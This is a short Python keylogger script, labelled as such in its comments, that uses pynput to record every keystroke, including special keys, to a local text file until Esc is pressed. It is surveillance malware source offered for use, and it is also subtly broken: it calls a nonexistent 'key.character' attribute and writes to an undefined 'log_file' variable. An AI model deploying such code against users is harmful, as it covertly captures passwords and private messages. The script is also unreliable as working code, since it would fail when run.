import pynput
from pynput.keyboard import Key, Listener

# Define the log file path
logfile_path = "key_log.txt"

# Create or open the log file
with open(logfile_path, 'w') as logfile:
    logfile.write("Keylogger started\n")

# Function to write keystrokes to the log file
def on_press(key):
    with open(logfile_path, 'a') as logfile:
        try:
            logfile.write(f'{key.character}')
        except AttributeError:
            if key == Key.space:
                log_file.write(' ')
            elif key == Key.enter:
                logfile.write('\n')
            elif key == Key.backspace:
                logfile.write('[BACKSPACE]')
            else:
                logfile.write(f'[{key}]')

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the key listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
